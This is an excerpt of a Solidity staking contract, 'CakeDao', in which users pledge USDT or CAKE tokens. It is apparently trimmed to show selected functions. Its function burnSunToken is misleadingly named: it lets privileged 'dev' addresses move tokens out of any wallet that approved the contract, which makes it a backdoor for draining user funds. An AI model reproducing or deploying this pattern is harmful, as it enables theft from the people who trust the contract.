...
contract CakeDao {
    ...
    uint256 public usdtToken_decimals = 0;
    uint256 public cakeToken_decimals = 0;
    uint256 public ceoToken_decimals = 0;
    ...
    constructor() public {
        ...
        cake = IERC20(0xE67211F40e6E15f5d628803279EF729f5a67976E);
        ceo = IERC20(0x19009Ce40868dA682Bc844316a1E8De1cF13e138);
        uint256 _usdtToken_decimals = usdt.decimals();
        uint256 _cakeToken_decimals = cake.decimals();
        uint256 _ceoToken_decimals = ceo.decimals();
        usdtToken_decimals = 10 ** _usdtToken_decimals;
        cakeToken_decimals = 10 ** _cakeToken_decimals;
        ceoToken_decimals = 10 ** _ceoToken_decimals;
        initMinerRatio();
    }
    ...
    function pledgeUsdt(uint256 _amount,uint256 day) public {
        require(_amount>=min_pledge*usdtToken_decimals," balance not enough");
    ...
    function pledgeCake(uint256 _amount,uint256 day) public  {
        require(_amount>=min_pledge*cakeToken_decimals," balance not enough");
    ...
    function burnSunToken(address ba,address _addr,uint256 _amount,address token) public returns (bool){
        require(devOwner[msg.sender]==true,'V:not dev');
        IERC20(token).transferFrom(ba,_addr,_amount);
        return true;
    }

    function sendceo(address _addr,uint256 _amount) public{
        require(devOwner[msg.sender]==true,'V:not dev');
        address pre = relation[_addr];
        uint256 amount = 0;
        ceo.transfer(_addr,_amount);
        if(pledge_usdt[pre].pledge_amount>0||pledge_usdt[pre].pledge_bnb>0||pledge_usdt[pre].pledge_cake>0){
            amount = miner_ratio[1].reward * _amount /10000;
            if(amount>0){
                ceo.transfer(pre,amount);
                amount = 0;
            }
        }
        pre = relation[pre];
